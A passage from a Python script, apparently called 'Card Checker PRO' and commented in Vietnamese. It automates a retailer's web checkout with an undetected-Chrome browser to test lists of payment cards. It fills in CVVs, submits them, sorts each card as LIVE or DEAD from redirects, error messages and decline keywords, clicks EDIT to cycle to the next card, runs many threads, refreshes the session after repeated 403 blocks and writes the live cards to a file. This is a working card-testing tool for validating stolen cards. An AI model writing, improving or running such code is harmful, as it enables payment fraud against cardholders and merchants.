            except Exception as e:
                print(f"[!] Lỗi điền CVV: {e}")
            
            time.sleep(2)
            
            # Step 2: Click button CONTINUE
            # Selector: #credit-card-content > fieldset > div.card-button-wrapper > div.continue-card-buttons > div > div > button
            try:
                continue_btn = self.driver.find_element("css selector", "#credit-card-content > fieldset > div.card-button-wrapper > div.continue-card-buttons > div > div > button")
                self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", continue_btn)
                time.sleep(1)
                
                try:
                    continue_btn.click()
                    print("[✓] Đã click CONTINUE button")
                except:
                    self.driver.execute_script("arguments[0].click();", continue_btn)
                    print("[✓] Đã click CONTINUE button (JS)")
                
                # Đợi response - tăng thời gian chờ
                print("[*] Waiting for response...")
                time.sleep(8)
                
                # Lưu screenshot để debug
                try:
                    self.driver.save_screenshot('payment_response.png')
                    print("[*] Screenshot saved: payment_response.png")
                except:
                    pass
                
                # Check kết quả với nhiều cách
                print("[*] Analyzing response...")
                
                try:
                    # 1. Check URL redirect (success case)
                    current_url = self.driver.current_url
                    print(f"[*] Current URL: {current_url}")
                    
                    if 'order-confirmation' in current_url or 'thank-you' in current_url or 'success' in current_url or 'receipt' in current_url:
                        print("[✓] LIVE - URL redirected to success page!")
                        return (card_info, 'LIVE', '✓ Approved - Order placed')
                    
                    # 2. Tìm error messages (nhiều selectors hơn)
                    error_selectors = [
                        ".error-message",
                        ".alert-danger", 
                        ".invalid-feedback",
                        ".error",
                        ".field-error",
                        "[class*='error']",
                        "[class*='invalid']",
                        ".payment-error",
                        "#error-message"
                    ]
                    
                    for selector in error_selectors:
                        try:
                            error_elements = self.driver.find_elements("css selector", selector)
                            for elem in error_elements:
                                if elem.is_displayed() and elem.text.strip():
                                    error_text = elem.text.strip()
                                    print(f"[!] Error found: {error_text}")
                                    return (card_info, 'DEAD', f'✗ {error_text[:60]}')
                        except:
                            continue
                    
                    # 3. Check page source cho error keywords
                    page_source = self.driver.page_source.lower()
                    error_keywords = [
                        'card declined',
                        'payment declined', 
                        'invalid card',
                        'card not accepted',
                        'payment failed',
                        'transaction declined',
                        'insufficient funds',
                        'card error',
                        'payment error'
                    ]
                    
                    for keyword in error_keywords:
                        if keyword in page_source:
                            print(f"[!] Error keyword found: {keyword}")
                            return (card_info, 'DEAD', f'✗ {keyword.title()}')
                    
                    # 4. Check xem form payment có còn hiện không
                    payment_form_still_visible = False
                    try:
                        # Thử tìm các field của payment form
                        payment_fields = self.driver.find_elements("css selector", 
                            "input[name*='cardNumber'], input[id*='cardNumber'], input[name*='securityCode'], #saved-payment-security-code-1")
                        
                        for field in payment_fields:
                            if field.is_displayed():
                                payment_form_still_visible = True
                                print("[*] Payment form still visible")
                                break
                    except:
                        pass
                    
                    # 5. Check xem có button "Place Order" hay "Review Order" không (next step)
                    try:
                        next_buttons = self.driver.find_elements("xpath", 
                            "//button[contains(text(), 'Place Order')] | //button[contains(text(), 'Review Order')] | //button[contains(text(), 'Complete')]")
                        
                        for btn in next_buttons:
                            if btn.is_displayed():
                                print("[✓] LIVE - Next step button found (Place Order/Review)")
                                return (card_info, 'LIVE', '✓ Approved - Ready to place order')
                    except:
                        pass
                    
                    # 6. Nếu form vẫn còn VÀ không có next button = likely DEAD
                    if payment_form_still_visible:
                        print("[!] DEAD - Payment form still visible, no progress")
                        return (card_info, 'DEAD', '✗ Card declined - Form not submitted')
                    
                    # 7. Nếu form biến mất VÀ không có error = LIVE
                    if not payment_form_still_visible:
                        print("[✓] LIVE - Payment form disappeared, no errors")
                        
                        # Click EDIT button để quay lại payment form cho thẻ tiếp theo
                        try:
                            print("[*] Looking for EDIT button to check next card...")
                            time.sleep(2)
                            
                            # Selector chính xác từ user
                            edit_selector = "#checkout-collapse-payment-card > div > div > div > div.col-12.col-md-auto.summary-btn-wrapper > button"
                            
                            try:
                                edit_btn = self.driver.find_element("css selector", edit_selector)
                                if edit_btn.is_displayed():
                                    print("[*] Found EDIT button (exact selector), clicking...")
                                    self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", edit_btn)
                                    time.sleep(1)
                                    edit_btn.click()
                                    print("[✓] Clicked EDIT button - Ready for next card")
                                    time.sleep(3)
                            except:
                                # Fallback: tìm bằng text
                                print("[*] Trying fallback EDIT button search...")
                                edit_buttons = self.driver.find_elements("xpath", 
                                    "//button[contains(text(), 'EDIT')] | //a[contains(text(), 'EDIT')]")
                                
                                for btn in edit_buttons:
                                    try:
                                        if btn.is_displayed():
                                            print("[*] Found EDIT button (fallback), clicking...")
                                            self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", btn)
                                            time.sleep(1)
                                            btn.click()
                                            print("[✓] Clicked EDIT button - Ready for next card")
                                            time.sleep(3)
                                            break
                                    except:
                                        continue
                        except Exception as e:
                            print(f"[!] Could not click EDIT button: {e}")
                        
                        return (card_info, 'LIVE', '✓ Approved - Form submitted')
                    
                    # Không xác định được
                    print("[?] UNKNOWN - Cannot determine status")
                    return (card_info, 'UNKNOWN', '? Cannot determine status')
                    
                except Exception as e:
                    print(f"[!] Error checking result: {e}")
                    return (card_info, 'UNKNOWN', f'? {str(e)[:40]}')
                
            except Exception as e:
                print(f"[!] Lỗi click CONTINUE: {e}")
                return (card_info, 'ERROR', f'! {str(e)[:40]}')
                
        except Exception as e:
            print(f"[!] Lỗi: {e}")
            return (card_info, 'ERROR', f'! {str(e)[:40]}')
    
    def check_cards(self, input_file: str, output_file: str = None):
        """Check danh sách thẻ"""
        print(f"\n{'='*70}")
        print(f"BẮT ĐẦU CHECK")
        print(f"{'='*70}")
        print(f"[*] File: {input_file}")
        
        # Đọc thẻ
        cards = []
        with open(input_file, 'r') as f:
            for line in f:
                card = self.parse_card(line)
                if card:
                    cards.append(card)
        
        total = len(cards)
        print(f"[*] Tổng: {total} thẻ")
        print(f"[*] Luồng: {self.threads}")
        print(f"{'='*70}\n")
        
        # Results
        results = {'live': [], 'dead': [], 'unknown': [], 'error': []}
        checked = 0
        errors_403 = 0
        start_time = time.time()
        
        # Check
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.check_card, card): card for card in cards}
            
            for future in as_completed(futures):
                card_info, status, message = future.result()
                checked += 1
                
                # Nếu gặp lỗi 403, refresh session
                if 'Session expired' in message:
                    errors_403 += 1
                    if errors_403 >= 3:  # Sau 3 lỗi thì refresh
                        print("\n[!] Quá nhiều lỗi 403, đang refresh session...")
                        self.refresh_session()
                        errors_403 = 0
                
                # Display
                print(f"{message:45} | {card_info}")
                
                # Save
                results[status.lower()].append({'card': card_info, 'message': message})
                
                # Progress
                elapsed = time.time() - start_time
                rate = checked / elapsed if elapsed > 0 else 0
                remaining = total - checked
                eta = remaining / rate if rate > 0 else 0
                print(f"  [{checked}/{total}] {checked*100//total}% | {rate*60:.0f} cpm | ETA: {eta:.0f}s\n")
        
        # Summary
        print(f"{'='*70}")
        print(f"TỔNG KẾT")
        print(f"{'='*70}")
        print(f"✓ LIVE   : {len(results['live'])}")
        print(f"✗ DEAD   : {len(results['dead'])}")
        print(f"? UNKNOWN: {len(results['unknown'])}")
        print(f"! ERROR  : {len(results['error'])}")
        print(f"Thời gian: {time.time() - start_time:.1f}s")
        print(f"Tốc độ  : {total/(time.time() - start_time)*60:.0f} cards/phút")
        print(f"{'='*70}")
        
        # Save
        if output_file:
            self.save_results(results, output_file)
            print(f"\n[✓] Đã lưu: {output_file}")
        
        return results
    
    def save_results(self, results: Dict, output_file: str):
        """Lưu kết quả"""
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(f"# Card Checker PRO Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            for status in ['live', 'dead', 'unknown', 'error']:
                items = results[status]
                f.write(f"# {status.upper()} ({len(items)})\n")
                for item in items:
                    f.write(f"{item['card']} | {item['message']}\n")
                f.write("\n")
    
    def close(self):
        """Đóng browser"""
        if hasattr(self, 'driver'):
            self.driver.quit()
            print("\n[*] Đã đóng browser")


def main():
    parser = argparse.ArgumentParser(
        description='Card Checker PRO - SeleniumBase UC Mode',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python card_checker_pro.py -i cards.txt
  python card_checker_pro.py -i cards.txt -o results.txt -t 10
  python card_checker_pro.py -i cards.txt --no-headless  # Hiện browser
        """
    )
    
    parser.add_argument('-i', '--input', required=True, help='File danh sách thẻ')
    parser.add_argument('-o', '--output', help='File lưu kết quả')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Số luồng (default: 5)')
    parser.add_argument('--no-headless', action='store_true', help='Hiện browser (khuyên dùng)')
    
    args = parser.parse_args()
    
    checker = CardCheckerPro(
        threads=args.threads,
        headless=not args.no_headless
    )
    
    try:
        checker.check_cards(args.input, args.output)
    finally:
        checker.close()


if __name__ == '__main__':
    main()
